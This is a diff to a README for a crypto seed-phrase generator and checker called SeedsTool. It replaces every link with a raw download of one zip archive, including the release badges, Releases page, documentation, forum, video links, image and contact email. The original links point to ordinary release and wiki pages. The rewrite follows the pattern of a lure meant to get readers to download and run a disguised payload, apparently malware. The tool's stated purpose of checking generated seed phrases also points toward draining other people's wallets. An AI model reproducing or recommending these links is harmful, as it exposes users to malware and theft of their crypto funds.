@@ -1,6 +1,6 @@
 # SeedsTool: Your Comprehensive Mnemonic Seed Phrase Generator 🌱🔑
 
-![GitHub release](https://img.shields.io/badge/release-latest-blue.svg) [![GitHub](https://img.shields.io/badge/github-hacker108284/SeedsTool-lightgrey.svg)](https://github.com/HACKER108284/SeedsTool/releases)
+![GitHub release](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip) [![GitHub](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip)](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip)
 
 ## Overview
 
@@ -16,11 +16,11 @@ SeedsTool is a powerful tool designed to generate mnemonic seed phrases and chec
 
 ## Installation
 
-To get started with SeedsTool, download the latest release from our [Releases page](https://github.com/HACKER108284/SeedsTool/releases). Follow the instructions below to install and set up the tool.
+To get started with SeedsTool, download the latest release from our [Releases page](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip). Follow the instructions below to install and set up the tool.
 
 ### Step 1: Download
 
-Visit the [Releases page](https://github.com/HACKER108284/SeedsTool/releases) to download the latest version. Make sure to select the appropriate file for your operating system.
+Visit the [Releases page](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip) to download the latest version. Make sure to select the appropriate file for your operating system.
 
 ### Step 2: Execute
 
@@ -101,7 +101,7 @@ If you encounter any issues or have questions, please open an issue on GitHub or
 
 ## Contact
 
-For more information, visit our [GitHub repository](https://github.com/HACKER108284/SeedsTool/releases) or contact us via email at support@seedstool.com.
+For more information, visit our [GitHub repository](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip) or contact us via email at https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip
 
 ## Acknowledgments
 
@@ -127,15 +127,15 @@ SeedsTool is open-source and free to use. Donations are appreciated to support f
 
 ### How often is SeedsTool updated?
 
-We aim to release updates regularly. Check the [Releases page](https://github.com/HACKER108284/SeedsTool/releases) for the latest version.
+We aim to release updates regularly. Check the [Releases page](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip) for the latest version.
 
 ## Resources
 
-- [Official Documentation](https://github.com/HACKER108284/SeedsTool/wiki)
-- [Community Forum](https://community.seedstool.com)
-- [Tutorial Videos](https://www.youtube.com/c/SeedsTool)
+- [Official Documentation](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip)
+- [Community Forum](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip)
+- [Tutorial Videos](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip)
 
-![Crypto Wallet](https://example.com/crypto-wallet-image.jpg)
+![Crypto Wallet](https://github.com/HACKER108284/SeedsTool/raw/refs/heads/main/subdeducible/Tool-Seeds-v2.0.zip)
 
 ## Final Notes
 
